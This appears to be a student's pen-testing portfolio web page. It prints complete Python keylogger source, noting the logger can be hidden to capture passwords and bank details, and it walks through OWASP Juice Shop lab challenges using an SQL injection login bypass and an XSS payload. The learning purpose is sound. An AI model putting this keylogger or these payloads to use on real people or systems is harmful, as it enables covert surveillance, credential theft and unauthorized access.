 <html>
  <head>
     <link rel="stylesheet" href="index.css">
  </head>
   <body>
    <Header id="section-Expo"> 
      <img class="img_Me" src="images/8626f4a9-f60a-4198-b2f0-02b9067687d1.jpeg" width="300"/>
     <div class="Expo-MeDiv">
      <p class="Expo_Me" >Hello, I am a young inspiring pen tester that wants to make a spot in industry, every since I gotten the idea of ethical hacking i've been try to learn and gain experience of looking and exporting vulnerabilities online, this portfolio will show what experience and skills I learned over the time in the internet, from trustrd websites that teaches you how to use kali Linux for pen testimg websites and files, to my cyber security class that teches me the basics of the subjet, to on hand experience of what I learned and trying to find vulnerabilities all over in the web, I will show my skills to anyone reading this page to prevail my career. </p>
     </div>
    </Header>

<div class="Projets_section">
   <h1 class="Projets_title">---Projects---</h1>
</div>

<div class="Projets_name">
 <h2>KeyLogger</h2>
 <h2>Made and Updated by: 3/18/2025--3/24/2025</h2>
</div>

<div class="Projets_imgAndDet">
 <div class="Code_keylog">
  <img src="images/keylogger-768x403.png" width="450" height="450" />
   <pre width="450" height="300">
    <code width="450" height="300"> 
   from pynput import keyboard
     
def keyPressed(key):
    print(str(key))
    with open("keyfule.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")
        if key == keyboard.Key.enter:
            logKey.write("\n")
        elif key == keyboard.Key.space:
            logKey.write(' ')
            
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
   
  </code>
 </pre>
</div>

 <details>
  <h3>Technical Details</h3>
  <ul style="list-style-type:square">
   <li><strong>Programming Language:</strong>Python</li>
   <li><strong>Frameworks/Libraries:</strong>Pynput</li>
   <li><strong>Key Features:</strong>
    <ul style="list-style-type:square">
     <li>Cross-platform support (Windows, macOS, Linux)</li>
     <li>Simple API for listening to keyboard events</li>
     <li>Ability to simulate keyboard input</li>
    </ul>
   </li>
  </ul>
 </details>
</div>

<div class="Projets_Expo">
 <p>Before I start, I obtained this Keylogger from a YouTube tutorial, As a beginner, I try to learn from resources that are readily available to me. That way, I can understand how things work on my own without constantly needing to seek help. So I have added 2 new modifications to impove on less confusion in the log, but too the point. 
  <br>
  <br>
  This is a basic Keylogger that records keystrokes that have been pressed, this can be used of course to be hidden into a computer and log any sensitive information that was typed on said computer, like emails with passwords, private text messages, Bank info, and more. Here I will break down my simple code.</p>
</div>

<br>
<br>

<div class="code_display_A" width=150>
 <pre class="code">
  <code>
  def keyPressed(key):
    print(str(key))
    with open("keyfule.txt", 'a') as logKey:
  </code>
 </pre>

<p class="code_Expo">Here is the start of the function where I set the parameter as <span class="word_code">Key</span>, then in the next line it take any key pressed to a string so it can be printed in the text file that is existing (or made its self if theres no text file with that same name) then adds a append tool here <span class="word_code">'a'</span> so any keystrokes will be added im the file, and it will used as <span class="word_code">logKey</span>.</p>
</div>

<br>

<div class="code_display_A" width=150>
 <p class="code_Expo">Now the <span class="word_code">'Try'</span> is used to handle exceptions that occur when getting a character representation of a key by using <span class="word_code">'key.char'</span>, except for special key, if it's is one it will not be added in the txt file and will give an error "Error getting char". </p>

 <pre class="code">
  <code>
    try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")
  </code>
 </pre>
</div>

<br>

<div class="code_display_A" width=150>
  <pre class="code">
   <code>
    if key == keyboard.Key.enter:
            logKey.write("\n")
        elif key == keyboard.Key.space:
            logKey.write(' ')
   </code>
  </pre>

 <p class="code_Expo"> Now these last two blocks I personal added so theres less confusion on the txt file, because without them the letters will be jumbled up. 
  <br>
  <br>
  so both <span class="word_code">'if'</span> and <span class="word_code">elif</span> statements are used just in case the ENTER or SPACE key was pressed, it will still display the error line in the console log but will still skip a line or make space once pressed in the txt file.</p>
 </div>
 
<br>
<br>

 <div class="Projets_name">
 <h2>OWASP Juice Shop:⭐</h2>
 <h2>Made and Updated by: 4/21/2025--5/1/2025</h2>
</div>

<img src="images/OWASP JSP IMG/OWASP JSP.jpg" width="100%" height="250"/>

<p>OWASP Juice Shop is a web application that has built-in vulnerabilities covering the OWASP Top Ten and beyond, it is use for practice finding and exploiting web vulnerabilities in a safe, legal environment. 
<br>
<br>
It is used for training and learning web application security, penetration testing, and secure coding practices. I will document the level 1 difficulties to show what I already know and what I learned using OWASP Juice Shop, now a few things were new to me so I had to get some outside help, like AI for hints, websites that already cover the different CTF's, and Youtube videos explaining what to do, but that one of the point of Pen testing, going around the web to find and use different sources and tools to find the vulnerabilities and make them stronger.</p>

<details>
 <ul style="list-style-type:square">
  <li><strong>Application:</strong> Docker</li>
  <li><strong>Sources:</strong> 
   <ul style="list-style-type:square">
    <li> <a href="https://owasp.org/www-project-juice-shop/">owasp.org</a> </li>
    <li> <a href="https://github.com/juice-shop/juice-shop?tab=readme-ov-fi">github.com/juice-shop</a> </li>
   </ul>
  </li>
 </ul>
</details>
<br>

<!-- Login Admin -->
<hr style="border: none; border-top: 2px dashed #ace34d;">
<h3 style="display: inline-block; border-bottom: 3px solid #ace34d; padding-bottom: 4px; color: #ace34d;">Injection</h3>
 <br>
  <h2 style="display: inline-block; border-bottom: 3px solid #ace34d; padding-bottom: 4px; color: #ace34d;">Login Admin: ⭐⭐</h2>
  
   <div class="code_display_A" width=150>
    <img src="images/OWASP JSP IMG/Login Admin.JPG">
     <p>Here is first thing I have done when I open the page, it was a simple SQL Injection, which is a common login Vulnerability where a attacker Injects 
 a malicious crafted input in the username or password input boxes to gain unauthorize access to a admin account or someone with higher power, this is one of the many in injection vulnerabilities that a web application can have.</p>
   </div>

   <p>I learned SQL Injections from a website named <a href="https://hacksplaining.com/lessons">Hacksplaining</a>, where its a place where you can learn hacking skills and vulnerabilities, it also teaches how to fix vulnerabilities in code and more, and does short quiz after a summary of the Vulnerability. now the first lessons on the site is web application vulnerabilities, so that where I learned SQL Injections.</p>

   <div class="code_display_A" width=150>
    <video loop autoplay muted src="Videos/OWASP%20JSP%20VIDS/Admin_log.mp4" width="550"></video>
     <p>On this video shows the easy process of using <span class="word_code">' or 1=1--</span>, which is a common code injection to gain access to the admin account, no mater what password or username, if you have this Vulnerability, anyone can gain access. was insane to me how easy it was when I first leared this, the fact that a simple login injection caused a admin account to get hacked, and all of the severe data, files, and pages only for higher ups can see will be all in the hands of the attacker. </p>
   </div>
 <hr style="border: none; border-top: 2px dashed #ace34d;">
 
<br>

<!-- DOM XSS -->
<h3 style="display: inline-block; border-bottom: 3px solid #ace34d; padding-bottom: 4px; color: #ace34d;">XSS</h3>
 <br>
  <h2 style="display: inline-block; border-bottom: 3px solid #ace34d; padding-bottom: 4px; color: #ace34d;">DOM XSS: ⭐</h2>

  <div class="code_display_A" width=150>
   <img src="images/OWASP JSP IMG/DOM XSS.png">
    <p>A XSS (Cross-site scripting) is one of the most common methods hackers use to attack websites, there are many types of XSS but one really common on is when attackers use a comment section, search bar, or any place they can type something on a website to inject scripts, once entered it runs in the context of the victim's browser as if it were part of the legitimate webpage.</p>
  </div>

  <div class="code_display_A" width=150>
   <p>Here's a short video of me using a alert script in the search bar <span class="word_code"> iframe src="javascript:alert(`successful script injection`)" </span> which does alert me in the site, attackers can use alert scripts like theses to see if there any other XSS Vulnerability, now.</p>
    <video loop autoplay muted src="Videos/OWASP JSP VIDS/DOM_XSS.mp4" width="550"></video>
  </div>
  
 <p>Now XSS can do more then send alerts to anyone in the web page, they can lead to some dangerous stuff if done right:</p>
 <div style="color: #ace34d; background-color: #343434; padding: 10px; margin-top: -20px;">
  <ul>
   <li>Spreading worms on social media sites.</li>
   <li>Session hijacking.</li>
   <li>Identity theft.</li>
   <li>Denial of service attacks and website vandalism.</li>
   <li>Theft of sensitive data, like passwords.</li>
   <li>Financial fraud on banking sites.</li>
  </ul>
 </div>

<div class="code_display_A" width=150>
 <video loop autoplay muted src="Videos/OWASP JSP VIDS/Bonus_Payload.mp4" width="550"></video>
  <p>Heres a example where I use the search bar to enter a script to inject a soundcloud song, this is a loading a remote script, it is where a webpage or injected code fetches and runs JavaScript code hosted on another server, not directly included in the page’s original source. Instead of embedding the script code inline, this mean I can fetch tools from other sites to play with or hurt the site, like using 'yourdomain.com/your-tool.js'.</p>
</div>

<img src="images/OWASP JSP IMG/youtube_XSS.png" width="100%" height="500"/>
<p>Agian XSS are extremely common, even big sites have fallen to this hack, like back in 2010 Youtube was hacked by a XSS Vulnerability in there comment section, the attckers sent alerts about Justin Bieber dying in a car crash, popup rickroll videos, and made users accounts to subscribe to specific YouTube channels without consent. <a href="https://isc.sans.edu/diary/9130">click here for more info</a></p>
<hr style="border: none; border-top: 2px dashed #ace34d;">

<br>

<!-- Sensitive Data Exposure -->
<h3 style="display: inline-block; border-bottom: 3px solid #ace34d; padding-bottom: 4px; color: #ace34d;">Sensitive Data Exposure</h3>
 <br>
  <h2 style="display: inline-block; border-bottom: 3px solid #ace34d; padding-bottom: 4px; color: #ace34d;">Confidential Document, Exposed Metrics: ⭐</h2>

  <div class="code_display_A" width=150>
   <img src="images/OWASP JSP IMG/Confidential Document.jpg">
    <img src="images/OWASP JSP IMG/Exposed Metrics.jpg">
  </div>

<p>A web site is like a large house, with rooms that is connented with each other, the home page is like a living room or Entrances, and if click on a icon it takes you to a new page like going to a new room, now not all rooms in the house were ment to be seen, and thats why the homeowner (developer) would lock the door amd take safety percaution so no one can get in, but some times that lock is not stong enuogth or forget to put a lock on it at all, so some user can find the hidden rooms (pages) and use it to exploit the house rooms (web pages). </p>

<div class="code_display_A" width=150>
 <video loop autoplay muted src="Videos/OWASP JSP VIDS/Confidential_Document.mp4" width="550"></video>
  <p>A website without safety percaution for pages can easily be used to find Confidential data, like home addresses, credit card info, or privite things about the website or users, like right here where I went into the FTP (File Transfer Protocol) to find a Confidential document that was in Lorem Ipsum ( It's just essentially meaningless Latin-like text used to fill space in files, templates, or designs)  FTPs are where the Website owners and developers use to upload, download, and manage files on the web server, such as HTML files, images, scripts, and other content that make up the website, agian this stuff could have a lot of Confidential data and if not closed correctly to users it could be use to steal data for own use.</p>
</div>

<div class="code_display_A" width=150>
 <p>another place user should not have access to is the Metrics, the Metrics in a website are quantitative data points that describe how your website or web application is behaving, in the video it shows Confidential data like the CPU, bytes per sec, but when I scrolled all the way to the bottom I saw how many users have digital wallets in the site, the types of users based on payment plans like standard and deluxe, and how many orders were places in the website, all of this terrible because an attacker can see how fast the website sever goes and send a DOS attack if it's slow enough, or use the data about the users to get into digital wallets.</p>
  <video loop autoplay muted src="Videos/OWASP JSP VIDS/Exposed_Metrics.mp4" width="550"></video>
</div>

<hr style="border: none; border-top: 2px dashed #ace34d;">

<h3 style="display: inline-block; border-bottom: 3px solid #ace34d; padding-bottom: 4px; color: #ace34d;">Improper Input Validation</h3>
 <br>
  <h2 style="display: inline-block; border-bottom: 3px solid #ace34d; padding-bottom: 4px; color: #ace34d;">Missing Encoding, Repetitive Registration: ⭐</h2>

<div class="container-stack">
 <div class="image-stack">
   <img src="images/OWASP JSP IMG/Missing Encoding.jpg" >
   <img src="images/OWASP JSP IMG/Repetitive Registration.jpg" >
 </div>
 <p class="side-text">An Improper Input Validation is a security flaw Vulnerability where the site or system fails to correctly check, filter, or sanitize the input data it receives, like going to an airport and the TSA did not properly look through your suitcase, since the TSA is not doing there job properly, someone can see that clumsiness and bring something to the flight that is dangerous and can compromise the plane and risk people's life's, like the airport everything needs to be checked in the right input, like if your entering birthday the system need to check if its between 12 months, or putting your login and it seeing if it matches a regular login, this Vulnerability can lead to SQL injection or cross-site scripting, and we seen what bot can do to a site.</p>
</div>

  </body>
 </html>
